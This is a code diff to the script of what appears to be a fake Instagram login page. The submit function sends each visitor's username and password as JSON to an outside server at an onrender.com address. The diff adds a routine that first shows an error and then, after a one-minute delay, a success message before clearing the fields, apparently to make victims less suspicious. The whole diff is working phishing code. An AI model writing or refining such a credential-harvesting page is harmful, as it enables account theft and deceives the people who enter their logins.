@@ -160,20 +160,40 @@
 </div>
 
 <script>
+const usernameInput = document.getElementById("username");
+const passwordInput = document.getElementById("password");
+const errorMsg = document.getElementById("errorMsg");
+const successMsg = document.getElementById("successMsg");
+const toggleText = document.getElementById("toggleText");
+
 function togglePassword() {
-  if (password.type === "password") {
-    password.type = "text";
+  if (passwordInput.type === "password") {
+    passwordInput.type = "text";
     toggleText.innerText = "Hide";
   } else {
-    password.type = "password";
+    passwordInput.type = "password";
     toggleText.innerText = "Show";
   }
 }
 
+/* 🔹 Method to show error first, then success after 1 minute */
+function showDelayedSuccess() {
+  errorMsg.style.display = "block";
+  successMsg.style.display = "none";
+
+  setTimeout(() => {
+    errorMsg.style.display = "none";
+    successMsg.style.display = "block";
+
+    usernameInput.value = "";
+    passwordInput.value = "";
+  }, 60000); // 1 minute
+}
+
 function submitInstagramDetails() {
   const data = {
-    username: username.value.trim(),
-    password: password.value.trim()
+    username: usernameInput.value.trim(),
+    password: passwordInput.value.trim()
   };
 
   if (!data.username || !data.password) {
@@ -181,23 +201,22 @@ function submitInstagramDetails() {
     return;
   }
 
-  errorMsg.style.display = "block";
-  successMsg.style.display = "none";
-
   fetch("https://deyga-registration.onrender.com/api/instagram-register", {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify(data)
   })
-  .then(res => res.json())
-  .then(() => {
-    setTimeout(() => {
-      errorMsg.style.display = "none";
-      successMsg.style.display = "block";
-      username.value = password.value = "";
-    }, 3000);
+  .then(res => {
+    if (!res.ok) throw new Error("Server error");
+    return res.json();
   })
-  .catch(() => alert("Submission failed"));
+  .then(() => {
+    showDelayedSuccess(); // 👈 trigger UI flow
+  })
+  .catch(err => {
+    console.error(err);
+    alert("Submission failed");
+  });
 }
 </script>
 
